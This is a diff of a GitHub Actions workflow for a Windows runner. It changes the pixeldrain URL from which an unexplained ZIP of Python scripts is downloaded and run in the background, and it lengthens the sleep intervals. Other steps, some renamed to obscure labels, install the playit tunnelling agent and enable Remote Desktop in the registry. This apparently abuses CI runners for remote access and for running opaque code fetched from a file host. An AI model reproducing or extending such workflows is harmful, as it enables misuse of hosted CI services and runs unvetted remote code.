@@ -13,14 +13,14 @@ jobs:
 
     - name: Download full ZIP and extract
       run: |
-        curl -L -o code.zip https://pixeldrain.com/api/file/NyVCxinU/info/zip/main1.zip
+        curl -L -o code.zip https://pixeldrain.com/api/file/dfNL4bpo/info/zip/main1.zip
         Start-Sleep -Seconds 5
         powershell -Command "Expand-Archive -Force code.zip extracted"
 
-    - name: Download and Install Playit
+    - name: Download-v5566
       run: |
         Invoke-WebRequest -Uri "https://github.com/playit-cloud/playit-agent/releases/download/v0.15.26/playit-windows-x86_64-signed.exe" -OutFile "$env:USERPROFILE\playit.exe"
-        Start-Sleep -Seconds 5  # Give some time for the download to complete
+        Start-Sleep -Seconds 5
 
     - name: TS-v4
       run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
@@ -36,7 +36,7 @@ jobs:
         cd extracted
         Write-Host "Starting main.py in background..."
         Start-Process python test.py
-        Start-Sleep -Seconds 10
+        Start-Sleep -Seconds 30
   
 
     - name: Start main.py (background)
@@ -52,7 +52,7 @@ jobs:
         cd extracted
         Write-Host "Starting main.py in background..."
         Start-Process python test2.py
-        Start-Sleep -Seconds 10
+        Start-Sleep -Seconds 30
 
 
     - name: Start main.py (background)
@@ -60,7 +60,7 @@ jobs:
         cd extracted
         Write-Host "Starting main.py in background..."
         Start-Process python test3.py
-        Start-Sleep -Seconds 10
+        Start-Sleep -Seconds 30
 
     - name: varton-7896
       env:
